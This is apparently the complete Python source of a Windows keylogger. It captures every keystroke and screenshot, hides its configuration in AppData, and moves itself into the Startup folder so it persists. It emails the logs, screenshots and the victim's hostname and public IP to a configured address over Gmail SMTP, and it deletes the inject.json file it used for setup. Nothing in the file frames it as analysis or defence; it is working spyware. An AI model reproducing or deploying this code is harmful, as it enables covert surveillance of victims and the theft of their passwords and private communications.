
#@# -----------------------------------IMPORTS----------------------------------- #@#


from pynput.keyboard import Key, Listener
import smtplib, ssl
import socket   
import requests
import os
import getpass
import sys
import json
import time
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import pyautogui

#%# ----CONSTANTS---- #%#

keys = []
screenshot_number = 0

const_senderEmail = str
const_senderPassword = str
const_receiverEmail = str
const_mode = str
const_screenshot = bool

const_check_amt = 35

#&# -----------------------------------JSON-FILES----------------------------------- #&#

USER = os.getlogin()
directory = "SKL"
parent_dir = f"C:/Users/{USER}/AppData/Roaming"
                
path = os.path.join(parent_dir, directory)
try:
        os.mkdir(path)
except:
        pass
try:
        with open(f"{path}/config.json","r") as f:
            json.load(f)
except:
        with open(f"{path}/config.json","w") as r:
             new = {'sender_email': 'sender', 'receiver_email': 'receiver', 'sender_password': 'password', "mode": 'mode',"screenshot": True}
             json.dump(new,r)

JsonPath = f"{path}/config.json"

#@# -----------------------------------CONFIG SAVER----------------------------------- #@#

def checkConfig():
    global const_senderEmail
    global const_senderPassword
    global const_receiverEmail 
    global const_mode 
    global const_screenshot 
    
    print(const_senderEmail)
    
        
    try:
        with open(f"{JsonPath}", "r") as Config:
                parsed = json.load(Config)
                const_senderEmail = parsed["sender_email"]
                const_senderPassword = parsed["sender_password"]
                const_receiverEmail = parsed["receiver_email"]
                const_mode = parsed["mode"]
                const_screenshot = parsed["screenshot"]
    except:
        with open(f"{JsonPath}", "w") as F:
            new_config = {"sender_email": const_senderEmail,"sender_password": const_senderPassword, "receiver_email":const_receiverEmail, "mode": const_mode, "screenshot": const_screenshot}
            json.dump(new_config,F)

#!# -----------------------------------STARTUP----------------------------------- #!#


USER_NAME = getpass.getuser()
Src = (sys.argv[0])
Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
try:
    shutil.move(Src, Dest)
except:
    pass        


#?# -----------------------------------EMAILS----------------------------------- #?#

def email(sender_email,sender_password,receiver_email,option, message=None,screenshot=None):
    smtp_server = "smtp.gmail.com"  # Change this to your email provider's SMTP server
    smtp_port = 587  # Port for TLS
    smtp_username = sender_email
    smtp_password = sender_password

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    
    if option == "screenshot": msg['Subject'] = "SCREENSHOT"
    if option == "message": msg['Subject'] = "KEYS-LOGGED"
    


    if option == "screenshot":
        screenshot.save("./SCREENSHOT.png")
        image_path = "./SCREENSHOT.png"
        msg.attach(MIMEText(f"{time.time()}", 'plain'))
        with open(image_path, "rb") as image_file:
            image = MIMEImage(image_file.read())
            image.add_header('Content-Disposition', 'attachment', filename="image.jpg")
            msg.attach(image)
           
            
    elif option == "message":
        msg.attach(MIMEText(f"{message}", "plain"))
        

    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()
    if option == "screenshot": os.remove("./SCREENSHOT.PNG")



#%# -----------------------------------HOST DATA----------------------------------- #%#
     

def get_ip_address(mode):
    url = 'https://api.ipify.org'
    response = requests.get(url)
    ip_address = response.text
    hostname = socket.gethostname()
    if mode == None:
        return hostname, ip_address
    elif mode == "ip":
        return ip_address
        
#!# -----------------------------------LOGGER----------------------------------- #!#

#&# ----CAPS-LOCK---- #&#

def CapsStatus():
    import ctypes
    return True if ctypes.WinDLL("User32.dll").GetKeyState(0x14) else False

#*# ----LOGGER---- #*#


def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode, Jscreenshot):                     
  
    checkConfig()

    with open(f"{JsonPath}","r") as file:
        parsed = json.load(file)

    mode = parsed['mode']

   
    if mode == "email": Email_mode = True; Key_mode = False
    elif mode == "local": Key_mode = True; Email_mode = False

 
    
#% ------------- KEY SYSTEM --------------- %#
    def on_press(key):
        
        global keys
        global const_check_amt
        sendBool = False
        if key == Key.space:
            key = " "
        elif key == Key.backspace:
            key = ""
            keys = keys[: -2]
        elif key == Key.enter:
            key = "\n"
            sendBool = True
        elif key == "'":
            key = "_Apostro4phe_"
        elif key == "\x01":
            key = ""
        elif str(key).startswith("Key."):
            key = ""
        
        
        if CapsStatus(): key = str(key); key = key.upper()  
        
        const_check_amt -= 1
    
        if const_check_amt == 0:
            checkConfig()
            const_check_amt = 35
        


            
#& ------------- KEY Saving SYSTEM --------------- &#

        keys.append(str(key))
        if sendBool == True:
            global screenshot_number
            message = "".join(keys)
            message = message.replace("'","")
            message = message.replace("_Apostro4phe_","'")
            #! Email
            if Email_mode == True:
                email(senderEmail,senderPassword,receiverEmail,"message", message)
                if Jscreenshot == True:
                    screenshot = pyautogui.screenshot()
                    email(senderEmail,senderPassword,receiverEmail,"screenshot",screenshot=screenshot)
            #!Key
            elif Key_mode == True:
                try:   
                    file = open(f"{path}/Log.txt", "a") 
                except:
                    file = open(f"{path}/Log.txt", "w")
                
                file.write(str(message))
                try:
                    os.mkdir(f"{path}/ScreenShots")
                except:
                    pass
                if Jscreenshot == True:
                    screenshot = pyautogui.screenshot()
                    screenshot.save(f"{path}/ScreenShots/ScreenShot-{screenshot_number}.png")
                    screenshot_number += 1
                
            
            sendBool = False
            keys = []
                

            
            
    def isMaillable():
        if Email_mode == True:
            try:
                host_Data = get_ip_address(None)
                email(senderEmail,senderPassword,receiverEmail,"message",message=f"Started Process || {host_Data}")
            except Exception as e:
                    pass
                
    with Listener(on_press=on_press) as listener :
        isMaillable()
        listener.join()




def check_config():
    try:
        with open(f"{JsonPath}") as f:
            data = json.load(f)
            try:
                senderEmail = data["sender_email"]
                senderPassword = data["sender_password"]
                receiver_email = data["receiver_email"]
                mode = data["mode"]
                screenshot = data["screenshot"]
            except:
                return False

    except:
         return False
    return True


try:
    with open(f"inject.json", "r") as Inject:
        parsed = json.load(Inject)
except:
        with open(f"{JsonPath}", "r") as Config:
                parsed = json.load(Config)
                JsenderEmail = parsed["sender_email"]
                JsenderPassword = parsed["sender_password"]
                JreceiverEmail = parsed["receiver_email"]
                Jmode = parsed["mode"]
                Jscreenshot = parsed["screenshot"]
                       
                           
        START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode, Jscreenshot)

    
    
with open(f"inject.json", "r") as Inject:
        parsed = json.load(Inject)
   
        with open(f"{JsonPath}", "w") as Config:
                    JsenderEmail = parsed["sender_email"]
                    JsenderPassword = parsed["sender_password"]
                    JreceiverEmail = parsed["receiver_email"]
                    Jmode = parsed["mode"]
                    Jscreenshot = parsed["screenshot"]
                    configData = {"sender_email": JsenderEmail, "sender_password": JsenderPassword,
                                            "receiver_email": JreceiverEmail,
                                            "mode": Jmode, "screenshot": Jscreenshot}
                                
                    json.dump(configData,Config)   
os.remove("inject.json")            
START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode, Jscreenshot)
